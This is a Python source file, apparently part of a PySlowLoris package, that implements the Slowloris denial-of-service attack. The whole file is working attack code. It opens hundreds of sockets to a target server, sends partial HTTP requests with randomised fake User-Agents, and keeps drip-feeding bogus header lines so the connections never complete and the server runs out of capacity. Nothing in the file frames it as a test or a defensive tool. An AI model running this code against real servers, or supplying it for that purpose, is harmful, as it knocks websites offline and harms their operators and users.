#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
MIT License

Copyright (c) 2017 Maxim Krivich

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import time
import socket
import random
import threading


from Queue import Queue
from PySlowLoris import logger
from fake_useragent import UserAgent, FakeUserAgentError


class Connection(threading.Thread):
    """
        This class implement SlowLoris connection
        This class extends Thread that's mean you must launch in like a thread.(Thank you, captain Obvious!)
    """
    SLEEP_TIME = 0.01
    COUNT_OF_PRODUCERS = 3

    def __init__(self, target, socket_count=300, headers={
        'User-Agent': None,  # UserAgent()
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ru,en-us;q=0.7,en;q=0.3',
        'Accept-Charset': 'windows-1251,utf-8;q=0.7,*;q=0.7',
        'Connection': 'keep-alive'
    }):
        """

        :param target: link to web server [TargetInfo]
        :param socket_count: maximum count of created socket default value 300
        :param headers: HTTP headers what puts in request
        """
        super(Connection, self).__init__()
        # self.lock = lock
        self.target = target
        self.headers = headers

        try:
            self.fake_ua = UserAgent()
        except FakeUserAgentError as fe:
            logger.error(fe)
        # Counters
        self.socket_count = socket_count
        self.__cnt_sent_requests = 0
        self.__cnt_died_sockets = 0
        self.__cnt_alive_socket = 0
        self.__sockets = []
        self.is_stop = False

    def isStopped(self):
        return self.is_stop

    def stop(self):
        self.is_stop = True

    def __del__(self):
        for soc in self.__sockets:
            try:
                soc.close()
            except socket.error:
                continue
            except Exception as ex:
                logger.exception(ex)
                # stop all daemons

    def __create_sockets(self, lock):
        """
        :param lock: mutex for socket list
        """
        while not self.isStopped():
            if self.__cnt_alive_socket < self.socket_count:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((unicode(self.target['ip']), self.target['port']))
                    sock.send("GET /? {} HTTP/1.1\r\n".format(random.randint(0, 9999999)))
                    for k in self.headers.keys():
                        if k == "User-Agent":
                            self.headers[k] = str(self.fake_ua.random)
                        sock.send("{key}:{value}\r\n".format(key=k, value=self.headers[k]))
                    lock.acquire()
                    self.__sockets.append(sock)
                    self.__cnt_alive_socket += 1
                    lock.release()
                except socket.error as err:
                    sock.close()
                    logger.error(err)
                except Exception as ex:
                    logger.exception(ex)

    def get_counter(self):
        return {"alive": self.__cnt_alive_socket, "died": self.__cnt_died_sockets,
                "requests": self.__cnt_sent_requests}

    def __send_requests(self, queue, lock):
        """
        :param queue: queue with sockets
        :param lock: mutex for main counters
        """
        while not self.isStopped():
            sock = queue.get()
            try:
                sock.send("X-a: {} \r\n".format(random.randint(0, 9999999)))
                lock.acquire()
                self.__cnt_sent_requests += 1
                lock.release()
                time.sleep(self.SLEEP_TIME * random.random())
            except socket.error:
                lock.acquire()
                self.__cnt_alive_socket -= 1
                self.__cnt_died_sockets += 1
                lock.release()
                self.__sockets.remove(sock)
                sock.close()
                # logger.error(err)
            except Exception as ex:
                logger.exception(ex)
            finally:
                queue.task_done()

    def run(self):
        create_lock = threading.Lock()
        counters_lock = threading.Lock()
        # run creators
        for _ in range(self.COUNT_OF_PRODUCERS):
            t = threading.Thread(target=self.__create_sockets, args=(create_lock,))
            t.daemon = True
            t.start()

        # waiting for sockets
        while self.__cnt_alive_socket < self.socket_count:
            time.sleep(1)

        queue = Queue(self.socket_count + 10)  # +10 for fun

        # run senders
        for _ in range(self.COUNT_OF_PRODUCERS):
            t = threading.Thread(target=self.__send_requests, args=(queue, counters_lock,))
            t.daemon = True
            t.start()

        while not self.isStopped():
            if self.__cnt_alive_socket < self.socket_count:
                time.sleep(1)

            random.shuffle(self.__sockets)

            for sock in self.__sockets:
                queue.put(sock)
                queue.join()
